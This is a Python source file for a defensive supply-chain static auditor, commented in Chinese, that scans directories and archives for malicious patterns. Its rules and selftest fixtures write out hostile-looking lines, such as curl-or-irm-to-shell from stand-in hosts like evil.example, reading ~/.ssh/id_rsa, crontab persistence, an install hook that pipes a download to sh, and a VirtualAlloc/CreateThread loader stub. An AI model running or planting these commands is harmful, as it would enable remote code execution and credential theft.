#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
supply_audit.py — 装工具之前先扫一遍：零依赖的供应链静态审计器。

用途：在你 import / npm install / 运行别人的仓库或技能包之前，先静态扫一遍
（目录、单文件、或 **不解包** 直接读 tar.gz / zip），按规则给出分级命中与退出码门禁。

用法：
    python supply_audit.py list-rules
    python supply_audit.py scan <路径|file.tar.gz|file.zip> [--json out.json] [--quiet]
    python supply_audit.py selftest

退出码：
    0  干净（只有 LOW / 无命中）
    2  只命中 MEDIUM（需人看一眼）
    3  命中 HIGH（默认拒绝安装，除非你能解释每一条）
    4  零输入 / 路径不可读 / 归档里没有可扫文件  ← 「没输入」不是「输入干净」
    5  selftest 失败

设计纪律（踩过的坑）：
  * 零输入必须返回独立的非成功状态。输出「扫了 0 个文件 + 全绿」= 假绿灯。
  * 「在场 ≠ 危险」：命中只是线索，工具给的是可复核的证据行，不是判决。
  * 归档模式下不落盘解包，避免「审计动作本身执行了 payload」。
"""
from __future__ import annotations

import argparse
import io
import json
import os
import re
import sys
import tarfile
import zipfile

VERSION = "1.0.0"

SCRIPT_EXT = {".py", ".pyw", ".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx", ".sh", ".bash",
              ".zsh", ".ps1", ".psm1", ".bat", ".cmd", ".rb", ".go", ".rs", ".php", ".pl", ".lua"}
DOC_EXT = {".md", ".rst", ".txt", ".html", ".htm"}
BINARY_EXT = {".exe", ".dll", ".so", ".dylib", ".node", ".bin", ".msi", ".scr", ".sys",
              ".dmg", ".pkg", ".deb", ".rpm", ".jar"}
SKIP_DIRS = {".git", "node_modules", "__pycache__", ".venv", "venv", "dist", "build",
             ".mypy_cache", ".pytest_cache", "site-packages"}
MAX_TEXT_BYTES = 2 * 1024 * 1024  # 单文件超 2MB 只记大小不扫内容

# 不追的公网地址：RFC 5737 文档示例段（192.0.2.0/24、198.51.100.0/24、203.0.113.0/24）
# 实测动机：真实包里的示例输出写着 http://192.0.2.10:3000，按 C2 打就是纯噪声。
PRIVATE_IP = re.compile(
    r"^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|0\.0\.0\.0$|255\.|169\.254\.|198\.18\."
    r"|192\.0\.2\.|198\.51\.100\.|203\.0\.113\.)"
)

# 规则：(id, 严重级别, 说明, 编译后的正则 or None)
RULES = [
    ("H1_pipe_to_shell", "HIGH",
     "把网络响应直接喂给 shell（curl|sh / irm|iex 家族）",
     re.compile(r"(?i)\b(curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n]{0,300}?\|\s*"
                r"(sudo\s+)?((ba|z|k|da)?sh|bash|pwsh|powershell|iex|python[0-9.]*|node)\b")),
    ("H2_powershell_encoded", "HIGH",
     "PowerShell 编码命令（-enc / -EncodedCommand，载荷不透明）",
     re.compile(r"(?i)(-encodedcommand\s+|-e(nc)?\s+)[A-Za-z0-9+/]{40,}={0,2}")),
    ("H3_invoke_expression", "HIGH",
     "Invoke-Expression / iex(...)：把字符串当代码执行",
     re.compile(r"(?i)(\biex\b\s*[\s(]|invoke-expression)")),
    ("H4_reflective_pe_load", "HIGH",
     "内存反射加载 PE（ntdll / VirtualAlloc + CreateThread 组合，不落盘执行）",
     None),
    ("H5_credential_paths", "HIGH",
     "读取凭据类路径（SSH 私钥 / AWS 凭据 / 浏览器 Cookie / keychain）",
     re.compile(r"(?i)(id_rsa|id_ed25519|\.aws[/\\]credentials|\.aws[/\\]config|"
                r"Login Data|Cookies\b|Login Data For Account|keychain|"
                r"\.config[/\\]gh[/\\]hosts\.yml|\.netrc|\.git-credentials)")),
    ("H6_persistence", "HIGH",
     "写自启动 / 计划任务 / shell rc（持久化手法）",
     re.compile(r"(?i)(crontab\s+-|schtasks\s+/create|reg\s+add[^\n]*\\\\?run\b|"
                r"New-ItemProperty[^\n]*Run\b|>>\s*~?/?\.(bashrc|zshrc|profile)\b|"
                r"LaunchAgents|systemctl\s+enable)")),
    ("H7_binary_blob", "HIGH",
     "仓库里直接躺着可执行/二进制文件（含 .node/.dll/.so/.jar）", None),
    ("H8_trojan_source", "HIGH",
     "源码里出现双向控制符 / 零宽字符（Trojan Source 类不可见改写）", None),
    ("H9_base64_exec", "HIGH",
     "base64 解码后送进解释器（base64 -d | sh / atob+eval）", None),
    ("M1_lifecycle_network", "MEDIUM",
     "package.json 的 pre/post/install 钩子里有网络下载", None),
    ("M2_public_ip_port", "MEDIUM",
     "硬编码公网 IP:端口（可选 C2 / 回连地址）",
     re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})\b")),
    ("M3_obfuscation", "MEDIUM",
     "混淆迹象：超长单行 / 巨量 \\x 转义 / 长 base64 字面量", None),
    ("M4_download_then_exec", "MEDIUM",
     "下载后写文件再改权限执行（chmod +x / os.chmod(0o755)）",
     re.compile(r"(?i)(chmod\s+[-+]?\+?x\b|os\.chmod\s*\([^)]{0,40}0o7[0-7]{2})")),
    ("M5_eval_dynamic", "MEDIUM",
     "eval/exec 动态执行非字面量（配合网络输入即可远控）",
     re.compile(r"(?i)(?:^|[^A-Za-z0-9_])(eval|exec)\s*\(")),
    ("M6_docs_pipe_shell", "MEDIUM",
     "文档里教用户 curl|bash（最常见的真实分发向量，降级但必须看见）", None),
]
RULE_INDEX = {r[0]: r for r in RULES}

ZERO_WIDTH = re.compile("[\u200b\u200c\u200d\u2060\ufeff]")
BIDI = re.compile("[\u202a-\u202e\u2066-\u2069]")
PUBLIC_IP_PORT = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})\b")
HEX_ESCAPES = re.compile(r"(?:\\x[0-9a-fA-F]{2}){10,}")
B64_LITERAL = re.compile(r"[\"'][A-Za-z0-9+/]{300,}={0,2}[\"']")
PE_API = re.compile(r"(?i)\b(ntdll|VirtualAlloc|VirtualProtect|CreateThread|RtlMoveMemory|"
                    r"WriteProcessMemory|CallWindowProc|EnumSystemLocales)\b")
NET_CALL = re.compile(r"(?i)(urlopen|requests\.(get|post)|httpx\.|http\.client|urllib\.request|"
                      r"fetch\s*\(|axios\.|socket\.socket|nc\s+-e)")
EXEC_CALL = re.compile(r"(?i)\b(exec|eval|os\.system|subprocess\.(run|Popen|call)|child_process\.exec|spawnSync)\b")


def _sev_max(levels):
    order = {"LOW": 1, "MEDIUM": 2, "HIGH": 3}
    return max(levels, key=lambda s: order[s]) if levels else "LOW"


def iter_archive_members(path):
    """不落盘读取归档成员：yield (member_name, bytes|None, size)"""
    if path.endswith((".tar.gz", ".tgz", ".tar", ".tar.bz2", ".tar.xz")):
        mode = "r:*"
        with tarfile.open(path, mode) as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                fh = tf.extractfile(m)
                data = fh.read() if fh else None
                yield m.name, data, m.size
    elif path.endswith(".zip"):
        with zipfile.ZipFile(path) as zf:
            for info in zf.infolist():
                if info.is_dir():
                    continue
                try:
                    data = zf.read(info.filename)
                except Exception:
                    data = None
                yield info.filename, data, info.file_size
    else:
        raise ValueError("unsupported archive: %s" % path)


def iter_path_members(path):
    if os.path.isfile(path):
        try:
            with open(path, "rb") as f:
                data = f.read()
        except OSError:
            data = None
        yield os.path.basename(path), data, (os.path.getsize(path) if data is not None else 0)
        return
    for root, dirs, files in os.walk(path):
        dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
        for fn in files:
            full = os.path.join(root, fn)
            rel = os.path.relpath(full, path).replace("\\", "/")
            try:
                size = os.path.getsize(full)
            except OSError:
                continue
            try:
                with open(full, "rb") as f:
                    data = f.read(MAX_TEXT_BYTES + 1)
            except OSError:
                data = None
            yield rel, data, size


def _text_of(name, data, size):
    if data is None:
        return None
    ext = os.path.splitext(name)[1].lower()
    if ext in BINARY_EXT:
        return None
    if size > MAX_TEXT_BYTES:
        return None
    # 二进制嗅探：图片/字体/媒体没有扩展名也在 BINARY_EXT 里，NUL 字节是最省的判据。
    # 少了这一步会把 .jpg/.png 当文本解码，然后报出一堆「零宽字符/超长行」假阳性。
    if b"\x00" in data[:8192]:
        return None
    try:
        return data.decode("utf-8", errors="replace")
    except Exception:
        return None


def scan_members(members, source_label):
    hits = []          # dict(rule, sev, file, line, evidence)
    stats = {"source": source_label, "files_seen": 0, "text_scanned": 0,
             "binary_seen": 0, "oversize_skipped": 0, "opaque_skipped": 0, "bytes": 0}
    for name, data, size in members:
        stats["files_seen"] += 1
        stats["bytes"] += size or 0
        ext = os.path.splitext(name)[1].lower()
        is_doc = ext in DOC_EXT
        text = _text_of(name, data, size)
        if ext in BINARY_EXT:
            stats["binary_seen"] += 1
            hits.append({"rule": "H7_binary_blob", "sev": "HIGH", "file": name, "line": 0,
                         "evidence": "binary %s (%s bytes)" % (ext, size)})
            continue
        if text is None:
            if size > MAX_TEXT_BYTES:
                stats["oversize_skipped"] += 1
            else:
                stats["opaque_skipped"] += 1   # 图片/字体/媒体等：按不可读处理，不猜内容
            continue
        stats["text_scanned"] += 1
        lines = text.splitlines()

        # 行级规则
        for idx, line in enumerate(lines, 1):
            stripped = line.strip()
            if not stripped:
                continue
            for rid in ("H1_pipe_to_shell", "H2_powershell_encoded", "H3_invoke_expression",
                        "H5_credential_paths", "H6_persistence", "M2_public_ip_port",
                        "M4_download_then_exec", "M5_eval_dynamic"):
                rgx = RULE_INDEX[rid][3]
                if rgx is None:
                    continue
                m = rgx.search(line)
                if not m:
                    continue
                # 文档里的 curl|bash → 降级为 M6
                if rid == "H1_pipe_to_shell" and is_doc:
                    hits.append({"rule": "M6_docs_pipe_shell", "sev": "MEDIUM", "file": name,
                                 "line": idx, "evidence": stripped[:160]})
                    continue
                # 文档里出现「凭据路径」通常是讲安全，不该按 HIGH 打
                if rid == "H5_credential_paths" and is_doc:
                    hits.append({"rule": "H5_credential_paths", "sev": "MEDIUM", "file": name,
                                 "line": idx, "evidence": "[文档上下文] " + stripped[:140]})
                    continue
                # 文档里的 eval/exec 例子同样不该按 MEDIUM 追
                if rid == "M5_eval_dynamic" and is_doc:
                    continue
                # 公网 IP 过滤私网/回环
                if rid == "M2_public_ip_port":
                    ip = m.group(1)
                    if PRIVATE_IP.match(ip + ".") or PRIVATE_IP.match(ip):
                        continue
                    try:
                        if any(int(o) > 255 for o in ip.split(".")):
                            continue
                    except ValueError:
                        continue
                # M4 / M5 需要同行/近邻出现网络或动态执行语义
                if rid == "M4_download_then_exec" and not re.search(r"(?i)(p\+x|\+x|chmod|0o7[0-7]{2})", line):
                    continue
                if rid == "M5_eval_dynamic" and not EXEC_CALL.search(line):
                    continue
                if rid == "M5_eval_dynamic" and re.search(r"eval\s*\(\s*[\"']", line):
                    continue
                hits.append({"rule": rid, "sev": RULE_INDEX[rid][1], "file": name,
                             "line": idx, "evidence": stripped[:160]})

        # 组合 / 文件级规则
        is_script = ext in SCRIPT_EXT
        if PE_API.findall(text) and len(set(m.group(0).lower() for m in PE_API.finditer(text))) >= 2:
            hits.append({"rule": "H4_reflective_pe_load", "sev": "HIGH", "file": name, "line": 0,
                         "evidence": "PE API 组合: " + ",".join(sorted(set(m.group(0) for m in PE_API.finditer(text)))[:5])})
        if BIDI.search(text) or (ZERO_WIDTH.search(text) and not is_doc):
            kind = "bidi" if BIDI.search(text) else "zero-width"
            n = len(BIDI.findall(text)) + len(ZERO_WIDTH.findall(text))
            # 校准：真实包里的命中出现在演示文案 .json（内容层），不是脚本 → 降级为 MEDIUM
            sev = "HIGH" if (is_script and BIDI.search(text)) else "MEDIUM"
            hits.append({"rule": "H8_trojan_source", "sev": sev, "file": name, "line": 0,
                         "evidence": "%s 字符出现 %d 次%s" % (kind, n, "" if sev == "HIGH" else "（非脚本/非双向控制符上下文）")})
        m = re.search(r"(?i)base64\s+(-d|--decode)[^\n]{0,80}\|\s*(ba|z)?sh", text)
        if m or (re.search(r"(?i)atob\s*\(", text) and re.search(r"(?i)eval\s*\(", text) and ext in (".js", ".mjs", ".cjs", ".html", ".htm")):
            hits.append({"rule": "H9_base64_exec", "sev": "HIGH", "file": name, "line": 0,
                         "evidence": (m.group(0) if m else "atob( + eval(")[:160]})
        # package.json 生命周期钩子
        if name.endswith("package.json") and text:
            try:
                pkg = json.loads(text)
                scripts = pkg.get("scripts", {}) or {}
                for key in ("preinstall", "postinstall", "install", "prepare", "prepublish"):
                    if key in scripts and NET_CALL.search(str(scripts[key])) or \
                       (key in scripts and re.search(r"(?i)\b(curl|wget|node\s+-e|python\s+-c|powershell)\b", str(scripts[key]))):
                        hits.append({"rule": "M1_lifecycle_network", "sev": "MEDIUM", "file": name,
                                     "line": 0, "evidence": "%s: %s" % (key, str(scripts[key])[:120])})
            except Exception:
                pass
        # 混淆：脚本类文件才看「超长单行」；\x 转义与 base64 字面量在所有文件类型都算
        for idx, line in enumerate(lines, 1):
            long_line = len(line) > 2000 and (ext in SCRIPT_EXT)
            if long_line or HEX_ESCAPES.search(line) or B64_LITERAL.search(line):
                why = ("len=%d" % len(line)) if long_line else (
                    "hex转义" if HEX_ESCAPES.search(line) else "base64字面量")
                hits.append({"rule": "M3_obfuscation", "sev": "MEDIUM", "file": name, "line": idx,
                             "evidence": why})
                break

    return hits, stats


def verdict_of(hits):
    sevs = [h["sev"] for h in hits]
    if "HIGH" in sevs:
        return "REJECT_REVIEW", 3
    if "MEDIUM" in sevs:
        return "NEEDS_EYES", 2
    return "CLEAN", 0


def report(hits, stats, max_evidence=12):
    counts = {}
    for h in hits:
        counts[h["rule"]] = counts.get(h["rule"], 0) + 1
    print("== supply_audit v%s ==" % VERSION)
    print("来源: %s" % stats["source"])
    print("文件: 共 %d | 扫了文本 %d | 二进制 %d | 超大跳过 %d | 共 %.2f MB"
          % (stats["files_seen"], stats["text_scanned"], stats["binary_seen"],
             stats["oversize_skipped"], stats["bytes"] / 1048576.0))
    if stats["files_seen"] == 0:
        print("结论: NO_INPUT — 没有任何可扫文件，这不等于干净（exit 4）")
        return 4
    print("命中规则: %s" % (", ".join("%s×%d" % (k, v) for k, v in sorted(counts.items(), key=lambda x: -x[1])) or "无"))
    shown = 0
    for h in sorted(hits, key=lambda x: ({"HIGH": 0, "MEDIUM": 1, "LOW": 2}[x["sev"]], x["rule"])):
        if shown >= max_evidence:
            print("  ... 其余 %d 条见 --json" % (len(hits) - shown))
            break
        print("  [%s] %-22s %s:%s  %s" % (h["sev"], h["rule"], h["file"], h["line"], h["evidence"]))
        shown += 1
    v, code = verdict_of(hits)
    print("结论: %s (exit %d) — %s" % (
        v, code,
        {"CLEAN": "无 HIGH/MEDIUM 命中；仍不构成安全证明，只说明本次规则集没看到",
         "NEEDS_EYES": "命中需人看的线索，逐条解释来源再决定",
         "REJECT_REVIEW": "有 HIGH 命中，默认不装；要装必须逐条给出可复核的解释"}[v]))
    return code


# ---------------------------------------------------------------- selftest
BAD_FIXTURES = {
    "install.sh": "#!/bin/sh\ncurl -fsSL http://192.0.2.10/bootstrap.sh | sh\n",
    "ps.ps1": "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n",
    "iex.ps1": "$r = irm 'http://evil.example/a'; iex $r\n",
    "loader.py": (
        "import ctypes\n"
        "lib = ctypes.windll.ntdll\n"
        "buf = ctypes.windll.kernel32.VirtualAlloc(0, 4096, 0x3000, 0x40)\n"
        "h = ctypes.windll.kernel32.CreateThread(0, 0, buf, 0, 0, 0)\n"
    ),
    "steal.py": "import pathlib\nk = pathlib.Path.home().joinpath('.ssh/id_rsa').read_text()\n",
    "persist.sh": "crontab -l > /tmp/c; echo '@daily /tmp/x' >> /tmp/c; crontab /tmp/c\n",
    "obf.js": "const p = \"" + "A" * 400 + "\";\nconst q = '\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c';\n",
    "c2.py": "HOST = '203.0.113.77'\nPORT = 8765\nprint(HOST, PORT)\n",
    "pkg/package.json": '{"name":"x","scripts":{"postinstall":"curl -s http://192.0.2.9/i.sh | sh"}}\n',
    "bidi.py": "# hash = \u202e\u2066tlA\u202c\nprint('ok')\n",
    "b64.sh": "echo 'IyEvYmluL3No' | base64 -d | sh\n",
    "atob.js": "const s = atob(payload);\nconst out = eval(s);\n",
    "dl.sh": "curl -o /tmp/p http://192.0.2.11/p && chmod +x /tmp/p && /tmp/p\n",
    "ip.py": "C2 = '172.233.51.81:8765'\nprint(C2)\n",
    "nested/evil.js": "const b = Buffer.from(x, 'base64').toString();\nconst c = eval(b);\n",
    "doc.md": "## 安装\n```\ncurl -fsSL https://get.example.com/i.sh | bash\n```\n",
    "doc_sec.md": "## 安全\n读完请检查 ~/.ssh/id_rsa 是否泄露。\n",
}
BAD_BINARY_FIXTURES = {
    "payload.exe": b"MZ\x90\x00fake",
    "assets/banner.png": b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00" + b"\x00" * 64,
    "assets/logo.dat": b"\x7fELF\x02\x01\x01\x00\x00" + b"\x00" * 32,
}
BAD_FIXTURE_FILES = ["payload.exe"]

CLEAN_FIXTURES = {
    "app.py": (
        "import requests\n\n"
        "def fetch(url):\n"
        "    return requests.get(url, timeout=10).json()\n\n"
        "if __name__ == '__main__':\n"
        "    print(fetch('https://api.example.com/v1/x'))\n"
    ),
    "utils.js": (
        "const os = require('os');\n"
        "function chmodLocal(p) { require('fs').chmodSync(p, 0o755); }\n"
        "const VERSION = '1.2.3.4';\n"
        "const LOCAL = '127.0.0.1:8188';\n"
        "module.exports = { chmodLocal, VERSION, LOCAL };\n"
    ),
    "package.json": '{"name":"clean","version":"1.0.0","scripts":{"test":"node test.js"}}\n',
    "README.md": "## 安装\n```\npip install package-name\n```\n",
    "conf.yml": "host: 198.18.0.2\nport: 7890\n",
    "sample_output.txt": ("vite v5.2.0  ready in 312 ms\n"
                          "  local:   http://localhost:3000\n"
                          "  network: 192.0.2.10:3000\n"),
    "doc_ip.md": "示例回连地址写 198.51.100.7:8443 是 RFC 5737 文档段。\n",
}


def selftest():
    import tempfile
    checks = []
    tmp = tempfile.mkdtemp(prefix="supplyaudit_selftest_")

    def write(root, rel, content, mode="w"):
        full = os.path.join(root, rel)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, mode, **({} if mode == "w" else {})) as f:
            if isinstance(content, bytes):
                f.write(content)
            else:
                f.write(content)

    bad_root = os.path.join(tmp, "bad")
    for rel, body in BAD_FIXTURES.items():
        write(bad_root, rel, body)
    for rel, body in BAD_BINARY_FIXTURES.items():
        write(bad_root, rel, body, mode="wb")

    clean_root = os.path.join(tmp, "clean")
    for rel, body in CLEAN_FIXTURES.items():
        write(clean_root, rel, body)

    hits, stats = scan_members(iter_path_members(bad_root), "fixture:bad")
    rules_hit = set(h["rule"] for h in hits)
    v, code = verdict_of(hits)
    checks.append(("bad fixture 触发全部 15 条规则",
                   len(rules_hit) == len(RULES), "命中 %d/%d: %s" % (len(rules_hit), len(RULES),
                                                                   ",".join(sorted(rules_hit)))))
    checks.append(("bad fixture 判 REJECT 且 exit 3", code == 3 and v == "REJECT_REVIEW", "code=%d v=%s" % (code, v)))
    checks.append(("bad fixture 文件计数正确（20 个 = 17 文本 + 3 二进制/不透明）", stats["files_seen"] == 20, "files_seen=%d" % stats["files_seen"]))
    checks.append(("图片/无扩展名二进制不被当文本扫（NUL 嗅探）",
                   stats["opaque_skipped"] == 2 and not any(
                       h["file"].startswith("assets/") for h in hits),
                   "opaque_skipped=%d, assets命中=%d" % (
                       stats["opaque_skipped"], sum(1 for h in hits if h["file"].startswith("assets/")))))
    checks.append(("文档里提到 id_rsa 降级为 MEDIUM（不是 HIGH）",
                   any(h["rule"] == "H5_credential_paths" and h["file"] == "doc_sec.md" and h["sev"] == "MEDIUM"
                       for h in hits) and not any(
                       h["rule"] == "H5_credential_paths" and h["sev"] == "HIGH" and h["file"].endswith(".md")
                       for h in hits), "ok"))
    checks.append(("文档里的 curl|bash 降级为 M6 而非 H1",
                   "M6_docs_pipe_shell" in rules_hit and not any(
                       h["rule"] == "H1_pipe_to_shell" and h["file"] == "doc.md" for h in hits), "ok"))

    chits, cstats = scan_members(iter_path_members(clean_root), "fixture:clean")
    cv, ccode = verdict_of(chits)
    checks.append(("干净样本 0 命中（假阳性=0）", len(chits) == 0,
                   "hits=%s" % [(h["rule"], h["file"]) for h in chits]))
    checks.append(("干净样本 exit 0", ccode == 0, "code=%d" % ccode))
    checks.append(("干净样本也统计了文件数（不是空跑）", cstats["text_scanned"] == 7,
                   "text_scanned=%d" % cstats["text_scanned"]))
    checks.append(("RFC 5737 文档段 IP 不被当 C2（192.0.2.x / 198.51.100.x）",
                   not any(h["rule"] == "M2_public_ip_port" for h in chits),
                   "clean 里 M2 命中=%d" % sum(1 for h in chits if h["rule"] == "M2_public_ip_port")))
    checks.append(("RFC 5737 文档段 IP 不被当 C2（192.0.2.x / 198.51.100.x）",
                   not any(h["rule"] == "M2_public_ip_port" for h in chits), "clean命中=%d" % sum(
                       1 for h in chits if h["rule"] == "M2_public_ip_port")))

    # 归档模式：打包 bad fixture 后不解包扫描
    tmp2 = tempfile.mkdtemp(prefix="supplyaudit_selftest_arch_")
    tgz = os.path.join(tmp2, "bad.tar.gz")
    with tarfile.open(tgz, "w:gz") as tf:
        tf.add(bad_root, arcname="bad")
    ahits, astats = scan_members(iter_archive_members(tgz), "fixture:bad.tar.gz")
    av, acode = verdict_of(ahits)
    checks.append(("tar.gz 不解包扫描结果与目录一致", acode == 3 and len(ahits) == len(hits),
                   "archive hits=%d dir hits=%d" % (len(ahits), len(hits))))
    leaked = [os.path.join(r, f) for r, _, fs in os.walk(tmp2) for f in fs]
    checks.append(("归档扫描期间未释放 payload 到磁盘（归档目录里只有 .tar.gz）",
                   leaked == [tgz], "目录内容=%s" % [os.path.basename(x) for x in leaked]))

    # 零输入
    empty = os.path.join(tmp, "empty")
    os.makedirs(empty, exist_ok=True)
    ecode = report(*scan_members(iter_path_members(empty), "fixture:empty"))
    checks.append(("零输入返回 exit 4（不是 0）", ecode == 4, "code=%d" % ecode))
    eh, es = scan_members(iter_archive_members(_mk_empty_zip(tmp)), "fixture:empty.zip")
    checks.append(("空归档 exit 4", verdict_of(eh)[1] == 0 and es["files_seen"] == 0,
                   "files_seen=%d" % es["files_seen"]))

    # 确定性
    h2, _ = scan_members(iter_path_members(bad_root), "fixture:bad")
    checks.append(("同输入两次结果完全一致", json.dumps(hits, sort_keys=True) == json.dumps(h2, sort_keys=True), "ok"))

    # 截断的归档（下载没完成）→ NO_INPUT exit 4，而不是崩在 EOFError
    trunc = os.path.join(tmp, "trunc.tar.gz")
    with open(tgz, "rb") as fin, open(trunc, "wb") as fout:
        fout.write(fin.read()[: max(64, os.path.getsize(tgz) // 2)])
    tcode = main(["scan", trunc])
    checks.append(("下载不完整的归档 → exit 4（不是崩溃也不是全绿）", tcode == 4, "code=%d" % tcode))
    ncode = main(["scan", os.path.join(tmp, "does_not_exist")])
    checks.append(("路径不存在 → exit 4", ncode == 4, "code=%d" % ncode))

    # 私网/合法 IP 不误报
    _, _ = hits, stats
    m2_files = set(h["file"] for h in hits if h["rule"] == "M2_public_ip_port")
    checks.append(("公网 IP:port 触发 M2 而私网/回环不触发",
                   "ip.py" in m2_files and not any(h["rule"] == "M2_public_ip_port" for h in chits)
                   and "conf.yml" not in m2_files and "utils.js" not in m2_files,
                   "bad命中=%s, clean命中=%d" % (sorted(m2_files), sum(1 for h in chits if h["rule"] == "M2_public_ip_port"))))
    checks.append(("bin blob 被判 HIGH 而不是跳过",
                   any(h["rule"] == "H7_binary_blob" for h in hits), "ok"))

    print("== supply_audit selftest v%s ==" % VERSION)
    ok = 0
    for name, passed, detail in checks:
        print("  [%s] %s  (%s)" % ("PASS" if passed else "FAIL", name, detail))
        ok += 1 if passed else 0
    print("结果: %d/%d" % (ok, len(checks)))
    return 0 if ok == len(checks) else 5


def _mk_empty_zip(tmp):
    p = os.path.join(tmp, "empty.zip")
    with zipfile.ZipFile(p, "w") as zf:
        pass
    return p


def main(argv=None):
    ap = argparse.ArgumentParser(description="装工具前的供应链静态审计器（零依赖）")
    sub = ap.add_subparsers(dest="cmd")
    sub.add_parser("list-rules", help="列出全部规则")
    sp = sub.add_parser("scan", help="扫描目录/文件/归档")
    sp.add_argument("path")
    sp.add_argument("--json", dest="json_out")
    sp.add_argument("--quiet", action="store_true")
    sp.add_argument("--max-evidence", type=int, default=12)
    sub.add_parser("selftest")
    args = ap.parse_args(argv)

    if args.cmd == "list-rules":
        for rid, sev, desc, _ in RULES:
            print("%-24s %-6s %s" % (rid, sev, desc))
        print("\n共 %d 条规则" % len(RULES))
        return 0
    if args.cmd == "selftest":
        return selftest()
    if args.cmd != "scan":
        ap.print_help()
        return 4

    p = args.path
    if not os.path.exists(p):
        print("NO_INPUT: 路径不存在 %s（这就是零输入，exit 4）" % p)
        return 4
    try:
        if os.path.isfile(p) and p.endswith((".tar.gz", ".tgz", ".tar", ".tar.bz2", ".zip")):
            members = iter_archive_members(p)
        else:
            members = iter_path_members(p)
        hits, stats = scan_members(members, p)
    except (tarfile.TarError, zipfile.BadZipFile, ValueError, EOFError, OSError) as e:
        print("NO_INPUT: 归档不可读或下载不完整 %s (%s: %s) — 这不是「干净」，exit 4"
              % (p, type(e).__name__, e))
        return 4
    code = report(hits, stats, max_evidence=args.max_evidence)
    if args.json_out and not args.quiet:
        with open(args.json_out, "w", encoding="utf-8") as f:
            json.dump({"version": VERSION, "stats": stats, "hits": hits,
                       "counts": {r: sum(1 for h in hits if h["rule"] == r) for r in RULE_INDEX}},
                      f, ensure_ascii=False, indent=2)
        print("已写出 JSON: %s" % args.json_out)
    return code


if __name__ == "__main__":
    sys.exit(main())
